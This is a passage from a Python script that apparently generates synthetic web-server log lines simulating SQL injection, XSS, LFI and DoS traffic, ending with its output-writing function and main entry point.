                    delay_ms=preset["sqli_delay_ms"])
    elif attack_type == "xss":
        attack_xss(lines, fmt, ts, preset["xss_count"], attacker_ips,
                   delay_ms=preset["xss_delay_ms"])
    elif attack_type == "lfi":
        attack_lfi(lines, fmt, ts, preset["lfi_count"], attacker_ips,
                   delay_ms=preset["lfi_delay_ms"])
    elif attack_type == "dos":
        attack_dos(lines, fmt, ts, preset["dos_seconds"], preset["dos_rps"], dos_pool)


def _output(lines: list[str], path):
    text = "\n".join(lines)
    if path:
        import os
        os.makedirs(os.path.dirname(path) or ".", exist_ok=True)
        with open(path, "w", encoding="utf-8") as f:
            f.write(text + "\n")
        print(f"[info] Written {len(lines)} lines → {path}", file=sys.stderr)
    else:
        print(text)


if __name__ == "__main__":
    main()
